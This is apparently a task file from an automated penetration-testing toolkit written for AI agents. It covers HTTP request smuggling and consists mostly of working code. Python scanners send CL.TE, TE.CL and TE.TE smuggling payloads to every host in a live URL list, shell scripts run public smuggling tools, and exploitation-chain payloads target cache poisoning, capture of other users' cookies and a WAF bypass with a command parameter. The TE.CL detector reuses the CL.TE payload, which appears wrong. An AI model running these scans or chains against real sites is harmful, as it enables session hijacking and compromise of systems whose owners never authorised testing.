@@ -1,0 +1,783 @@
+================================================================================
+TASK 81 - HTTP REQUEST SMUGGLING
+================================================================================
+Covers testing_toolkit.txt Phase 11 Step 36
+Exploiting discrepancies between front-end and back-end HTTP parsing
+
+CRITICAL VULNERABILITY CLASS - Often leads to:
+- Cache poisoning
+- Session hijacking  
+- Credential theft
+- WAF bypass
+- Request routing manipulation
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts to test
+temp/agent1/waf_results.txt                <- WAF detection (bypass context)
+outputs/nuclei/tech_stack.json             <- Tech stack info
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/smuggling/
+    clte_vulnerable.txt                    <- CL.TE vulnerabilities
+    tecl_vulnerable.txt                    <- TE.CL vulnerabilities
+    tete_vulnerable.txt                    <- TE.TE vulnerabilities
+    h2c_vulnerable.txt                     <- HTTP/2 cleartext smuggling
+    smuggling_confirmed.txt                <- All confirmed smuggling
+    exploitation_chains.txt                <- Chained attacks (cache poison, etc.)
+
+outputs/vulnerabilities/SMUGGLE-*-CRITICAL.md  <- Individual vuln reports
+
+================================================================================
+[AGENT DECISION FRAMEWORK]
+================================================================================
+
+STOP AND THINK: Request smuggling requires understanding the architecture.
+
+    What is the infrastructure setup?
+    |
+    +-- Load Balancer / Reverse Proxy in front?
+    |   |
+    |   +-- CDN (Cloudflare, Akamai, Fastly)?
+    |   |   +-- High chance of smuggling if misconfigured
+    |   |   +-- Try CL.TE first (most common)
+    |   |
+    |   +-- Nginx/HAProxy as reverse proxy?
+    |   |   +-- Try TE.CL (nginx often vulnerable)
+    |   |
+    |   +-- AWS ALB/ELB?
+    |       +-- Try CL.TE and H2C smuggling
+    |
+    +-- Direct to application server?
+        +-- Lower chance but still test
+        +-- Focus on HTTP/2 downgrade attacks
+
+    Which technique to try first?
+    |
+    +-- CL.TE (Content-Length vs Transfer-Encoding)
+    |   +-- Front-end uses Content-Length
+    |   +-- Back-end uses Transfer-Encoding
+    |   +-- MOST COMMON vulnerability
+    |
+    +-- TE.CL (Transfer-Encoding vs Content-Length)
+    |   +-- Front-end uses Transfer-Encoding
+    |   +-- Back-end uses Content-Length
+    |   +-- Common with nginx front-ends
+    |
+    +-- TE.TE (Transfer-Encoding obfuscation)
+    |   +-- Both use TE but parse differently
+    |   +-- Obfuscate TE header to confuse one parser
+    |
+    +-- H2C (HTTP/2 Cleartext)
+        +-- Smuggle via HTTP/2 upgrade
+        +-- Bypass front-end entirely
+
+================================================================================
+PHASE 1: UNDERSTAND REQUEST SMUGGLING
+================================================================================
+
+-----------------------------------------
+1.1 How Request Smuggling Works
+-----------------------------------------
+Front-end (proxy/CDN) and back-end (app server) may disagree on 
+where one request ends and another begins.
+
+TWO HEADERS determine request body length:
+- Content-Length: Specifies exact byte count
+- Transfer-Encoding: chunked - Uses chunk sizes
+
+When servers disagree on which header to use, attacker can "smuggle"
+a second request hidden inside the first.
+
+EXAMPLE CL.TE Attack:
+```
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+Front-end sees: Content-Length: 13 (reads "0\r\n\r\nSMUGGLED")
+Back-end sees: Transfer-Encoding: chunked (reads until "0\r\n\r\n", leaves "SMUGGLED")
+
+The "SMUGGLED" part becomes the START of the next request!
+
+================================================================================
+PHASE 2: DETECTION WITH SMUGGLER TOOL
+================================================================================
+
+-----------------------------------------
+2.1 Install and Run smuggler
+-----------------------------------------
+#!/bin/bash
+# smuggler_scan.sh
+
+# Clone smuggler if not present
+if [ ! -d "temp/agent1/smuggler" ]; then
+    git clone https://github.com/defparam/smuggler.git temp/agent1/smuggler
+fi
+
+cd temp/agent1/smuggler
+
+mkdir -p ../../../outputs/smuggling
+
+echo "[*] Running smuggler on live hosts..."
+
+# Run against each host
+while read url; do
+    echo "[*] Testing: $url"
+    
+    python3 smuggler.py -u "$url" \
+        --timeout 10 \
+        2>&1 | tee -a ../../../outputs/smuggling/smuggler_raw.txt
+        
+done < ../../../outputs/live_base_urls.txt
+
+# Extract confirmed vulnerabilities
+grep -E "VULNERABLE|POSSIBLE" ../../../outputs/smuggling/smuggler_raw.txt \
+    > ../../../outputs/smuggling/smuggling_confirmed.txt
+
+echo "[*] Smuggler scan complete"
+
+-----------------------------------------
+2.2 Smuggler Output Interpretation
+-----------------------------------------
+Smuggler tests multiple techniques and reports:
+
+VULNERABLE - Confirmed smuggling possible
+POSSIBLE   - Likely vulnerable, needs manual verification
+TIMEOUT    - Server behaved differently (investigate)
+NOT VULN   - This technique doesn't work
+
+================================================================================
+PHASE 3: MANUAL CL.TE TESTING
+================================================================================
+
+-----------------------------------------
+3.1 CL.TE Detection Payload
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+clte_detect.py - Detect CL.TE request smuggling
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+def test_clte(url):
+    """Test for CL.TE smuggling vulnerability"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    # CL.TE detection payload
+    # Front-end (CL): sees 4 bytes "0\r\n\r\n"
+    # Back-end (TE): sees chunked end, then "X" starts next request
+    
+    payload = (
+        f"POST / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 6\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"\r\n"
+        f"0\r\n"
+        f"\r\n"
+        f"X"
+    )
+    
+    try:
+        # Create socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        # Strip port from host if present
+        connect_host = host.split(':')[0]
+        sock.connect((connect_host, port))
+        
+        # Send smuggle attempt
+        sock.send(payload.encode())
+        
+        # Wait and check response
+        time.sleep(2)
+        
+        # Send normal request to see if smuggled "X" affected it
+        normal_request = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+        )
+        sock.send(normal_request.encode())
+        
+        response = sock.recv(4096).decode('utf-8', errors='ignore')
+        sock.close()
+        
+        # If response shows "XGET" or unusual behavior, likely vulnerable
+        if "XGET" in response or "400" in response or "invalid" in response.lower():
+            print(f"[CRITICAL] CL.TE likely vulnerable: {url}")
+            return True
+            
+    except Exception as e:
+        print(f"[-] Error testing {url}: {e}")
+    
+    return False
+
+# Test all hosts
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        if test_clte(url):
+            with open('outputs/smuggling/clte_vulnerable.txt', 'a') as out:
+                out.write(f"{url}\n")
+
+-----------------------------------------
+3.2 CL.TE Time-Based Detection
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+clte_timing.py - Time-based CL.TE detection (more reliable)
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+def test_clte_timing(url):
+    """Use timing to detect CL.TE smuggling"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    # This payload causes back-end to wait for more data
+    # If vulnerable, response will be delayed
+    
+    payload = (
+        f"POST / HTTP/1.1\r\n"
+        f"Host: {parsed.netloc}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 4\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"\r\n"
+        f"1\r\n"
+        f"A\r\n"
+        f"X"  # Incomplete chunk - back-end waits for "0\r\n\r\n"
+    )
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(15)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        start_time = time.time()
+        sock.send(payload.encode())
+        
+        try:
+            response = sock.recv(4096)
+            elapsed = time.time() - start_time
+        except socket.timeout:
+            elapsed = time.time() - start_time
+        
+        sock.close()
+        
+        # If response took > 10 seconds, back-end was waiting = VULNERABLE
+        if elapsed > 10:
+            print(f"[CRITICAL] CL.TE CONFIRMED (timing): {url} - {elapsed:.2f}s delay")
+            return True
+        else:
+            print(f"[*] {url} - {elapsed:.2f}s (not vulnerable)")
+            
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+# Main
+results = []
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        if test_clte_timing(url):
+            results.append(url)
+
+# Save results
+with open('outputs/smuggling/clte_vulnerable.txt', 'w') as f:
+    for url in results:
+        f.write(f"{url}\n")
+
+print(f"\n[*] Found {len(results)} CL.TE vulnerable hosts")
+
+================================================================================
+PHASE 4: TE.CL TESTING
+================================================================================
+
+-----------------------------------------
+4.1 TE.CL Detection Payload
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+tecl_detect.py - Detect TE.CL request smuggling
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+def test_tecl_timing(url):
+    """Time-based TE.CL detection"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    # TE.CL payload
+    # Front-end (TE): reads chunked body, sees complete request
+    # Back-end (CL): reads Content-Length bytes, leaves rest for next request
+    
+    # This makes back-end wait (it's reading more than we sent)
+    payload = (
+        f"POST / HTTP/1.1\r\n"
+        f"Host: {parsed.netloc}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 6\r\n"
+        f"Transfer-Encoding: chunked\r\n"
+        f"\r\n"
+        f"0\r\n"
+        f"\r\n"
+        f"X"
+    )
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(15)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        start_time = time.time()
+        sock.send(payload.encode())
+        
+        try:
+            response = sock.recv(4096)
+            elapsed = time.time() - start_time
+        except socket.timeout:
+            elapsed = time.time() - start_time
+        
+        sock.close()
+        
+        if elapsed > 10:
+            print(f"[CRITICAL] TE.CL CONFIRMED (timing): {url}")
+            return True
+            
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+# Main
+results = []
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        if test_tecl_timing(url):
+            results.append(url)
+
+with open('outputs/smuggling/tecl_vulnerable.txt', 'w') as f:
+    for url in results:
+        f.write(f"{url}\n")
+
+================================================================================
+PHASE 5: TE.TE OBFUSCATION TESTING
+================================================================================
+
+-----------------------------------------
+5.1 TE.TE Obfuscation Techniques
+-----------------------------------------
+When both servers use Transfer-Encoding, try to make one ignore it:
+
+OBFUSCATION PAYLOADS:
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked
+```
+
+-----------------------------------------
+5.2 TE.TE Scanner
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+tete_detect.py - TE.TE obfuscation detection
+"""
+
+import socket
+import ssl
+import time
+from urllib.parse import urlparse
+
+# Various TE obfuscation techniques
+TE_OBFUSCATIONS = [
+    "Transfer-Encoding: xchunked",
+    "Transfer-Encoding : chunked",       # Space before colon
+    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",  # Duplicate
+    "Transfer-Encoding:\tchunked",       # Tab instead of space
+    "Transfer-Encoding: chunked\r\n X: X",  # Line continuation
+    "Transfer-Encoding:\n chunked",      # Newline + space
+    "Transfer-Encoding: CHUNKED",        # Uppercase
+    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
+    "Transfer-Encoding: chunked, identity",
+]
+
+def test_tete(url, te_header):
+    """Test specific TE obfuscation"""
+    
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    payload = (
+        f"POST / HTTP/1.1\r\n"
+        f"Host: {parsed.netloc}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 4\r\n"
+        f"{te_header}\r\n"
+        f"\r\n"
+        f"1\r\n"
+        f"Z\r\n"
+        f"Q"
+    )
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(15)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        start_time = time.time()
+        sock.send(payload.encode())
+        
+        try:
+            response = sock.recv(4096)
+            elapsed = time.time() - start_time
+        except socket.timeout:
+            elapsed = time.time() - start_time
+        
+        sock.close()
+        
+        if elapsed > 10:
+            return True
+            
+    except:
+        pass
+    
+    return False
+
+# Test all obfuscations
+results = []
+
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        print(f"[*] Testing TE.TE obfuscation: {url}")
+        
+        for te_header in TE_OBFUSCATIONS:
+            if test_tete(url, te_header):
+                print(f"[CRITICAL] TE.TE vulnerable with: {te_header[:30]}...")
+                results.append(f"{url}|{te_header}")
+                break
+
+with open('outputs/smuggling/tete_vulnerable.txt', 'w') as f:
+    for result in results:
+        f.write(f"{result}\n")
+
+================================================================================
+PHASE 6: HTTP/2 SMUGGLING (H2C)
+================================================================================
+
+-----------------------------------------
+6.1 h2csmuggler Tool
+-----------------------------------------
+#!/bin/bash
+# h2c_smuggle.sh
+
+# Install h2csmuggler if not present
+if [ ! -d "temp/agent1/h2csmuggler" ]; then
+    git clone https://github.com/BishopFox/h2cSmuggler.git temp/agent1/h2csmuggler
+    cd temp/agent1/h2csmuggler
+    pip install -r requirements.txt
+    cd ../../..
+fi
+
+mkdir -p outputs/smuggling
+
+echo "[*] Testing HTTP/2 cleartext smuggling..."
+
+while read url; do
+    echo "[*] H2C test: $url"
+    
+    python3 temp/agent1/h2csmuggler/h2csmuggler.py \
+        --scan-list outputs/live_base_urls.txt \
+        --threads 5 \
+        2>&1 | tee -a outputs/smuggling/h2c_raw.txt
+        
+done < outputs/live_base_urls.txt
+
+# Extract vulnerable
+grep -i "SMUGGLED\|VULNERABLE" outputs/smuggling/h2c_raw.txt \
+    > outputs/smuggling/h2c_vulnerable.txt
+
+-----------------------------------------
+6.2 Manual H2C Test
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+h2c_manual.py - Manual HTTP/2 cleartext smuggling test
+"""
+
+import socket
+import ssl
+
+def test_h2c_upgrade(url):
+    """Test if server allows HTTP/2 upgrade (h2c smuggling)"""
+    
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    host = parsed.netloc.split(':')[0]
+    port = 443 if parsed.scheme == 'https' else 80
+    
+    # HTTP/2 upgrade request
+    # If front-end allows upgrade but back-end doesn't understand,
+    # we can smuggle HTTP/1.1 requests inside HTTP/2 frames
+    
+    upgrade_request = (
+        f"GET / HTTP/1.1\r\n"
+        f"Host: {parsed.netloc}\r\n"
+        f"Upgrade: h2c\r\n"
+        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
+        f"Connection: Upgrade, HTTP2-Settings\r\n"
+        f"\r\n"
+    )
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        
+        if port == 443:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        sock.send(upgrade_request.encode())
+        
+        response = sock.recv(4096).decode('utf-8', errors='ignore')
+        sock.close()
+        
+        # 101 Switching Protocols = upgrade accepted = potentially exploitable
+        if "101" in response and "Switching Protocols" in response:
+            print(f"[CRITICAL] H2C upgrade accepted: {url}")
+            return True
+        elif "Upgrade" in response:
+            print(f"[*] H2C mentioned in response: {url}")
+            return "possible"
+            
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+# Main
+with open('outputs/live_base_urls.txt') as f:
+    for line in f:
+        url = line.strip()
+        result = test_h2c_upgrade(url)
+        if result:
+            with open('outputs/smuggling/h2c_vulnerable.txt', 'a') as out:
+                out.write(f"{url}|{result}\n")
+
+================================================================================
+PHASE 7: EXPLOITATION CHAINS
+================================================================================
+
+-----------------------------------------
+7.1 Smuggling to Cache Poisoning
+-----------------------------------------
+Once smuggling is confirmed, chain to cache poisoning:
+
+ATTACK FLOW:
+1. Smuggle request that changes response for next user
+2. Next user's request gets your malicious response
+3. If cached, ALL users get poisoned response
+
+PAYLOAD EXAMPLE (CL.TE + Cache Poison):
+```
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 128
+Transfer-Encoding: chunked
+
+0
+
+GET /static/poisoned.js HTTP/1.1
+Host: vulnerable.com
+X-Ignore: X
+```
+
+The smuggled GET request may get cached with attacker-controlled content.
+
+-----------------------------------------
+7.2 Smuggling to Credential Theft
+-----------------------------------------
+Capture another user's request:
+
+```
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 43
+Transfer-Encoding: chunked
+
+0
+
+POST /log HTTP/1.1
+Content-Length: 10000
+```
+
+Next user's request (with cookies/auth) becomes body of POST to /log!
+
+-----------------------------------------
+7.3 Smuggling to WAF Bypass
+-----------------------------------------
+Hide malicious payloads in smuggled requests:
+
+```
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /admin?cmd=whoami HTTP/1.1
+Host: vulnerable.com
+X: X
+```
+
+WAF sees normal POST, but back-end processes smuggled GET with payload.
+
+================================================================================
+PHASE 8: CONSOLIDATE RESULTS
+================================================================================
+
+#!/bin/bash
+# consolidate_smuggling.sh
+
+mkdir -p outputs/smuggling
+
+echo "# Request Smuggling Results" > outputs/smuggling/smuggling_confirmed.txt
+echo "# Generated: $(date)" >> outputs/smuggling/smuggling_confirmed.txt
+echo "" >> outputs/smuggling/smuggling_confirmed.txt
+
+echo "## CL.TE Vulnerable:" >> outputs/smuggling/smuggling_confirmed.txt
+cat outputs/smuggling/clte_vulnerable.txt 2>/dev/null >> outputs/smuggling/smuggling_confirmed.txt
+
+echo "" >> outputs/smuggling/smuggling_confirmed.txt
+echo "## TE.CL Vulnerable:" >> outputs/smuggling/smuggling_confirmed.txt
+cat outputs/smuggling/tecl_vulnerable.txt 2>/dev/null >> outputs/smuggling/smuggling_confirmed.txt
+
+echo "" >> outputs/smuggling/smuggling_confirmed.txt
+echo "## TE.TE Vulnerable:" >> outputs/smuggling/smuggling_confirmed.txt
+cat outputs/smuggling/tete_vulnerable.txt 2>/dev/null >> outputs/smuggling/smuggling_confirmed.txt
+
+echo "" >> outputs/smuggling/smuggling_confirmed.txt
+echo "## H2C Vulnerable:" >> outputs/smuggling/smuggling_confirmed.txt
+cat outputs/smuggling/h2c_vulnerable.txt 2>/dev/null >> outputs/smuggling/smuggling_confirmed.txt
+
+# Count
+TOTAL=$(cat outputs/smuggling/*_vulnerable.txt 2>/dev/null | wc -l)
+echo ""
+echo "=========================================="
+echo "TASK 81 SUMMARY - Request Smuggling"
+echo "=========================================="
+echo "Total vulnerable endpoints: $TOTAL"
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+Before marking Task 81 complete, verify:
+
+[ ] smuggler tool scan completed
+[ ] CL.TE timing-based detection run
+[ ] TE.CL timing-based detection run  
+[ ] TE.TE obfuscation variants tested
+[ ] h2csmuggler HTTP/2 test completed
+[ ] All results saved to outputs/smuggling/
+[ ] Vulnerability reports created for confirmed findings
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+
+PRIMARY TOOLS:
+- smuggler: https://github.com/defparam/smuggler
+- h2csmuggler: https://github.com/BishopFox/h2cSmuggler
+- http-request-smuggler (Burp): For manual verification
+
+DETECTION METHODS:
+1. Timing-based (most reliable)
+2. Differential response analysis
+3. Connection state manipulation
+
+SEVERITY: CRITICAL
+- Request smuggling often leads to complete compromise
+- Can bypass all front-end security controls
+- Chain to cache poisoning, credential theft, RCE
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 82: HTTP/2 Attacks (HPACK bombing, stream race conditions)
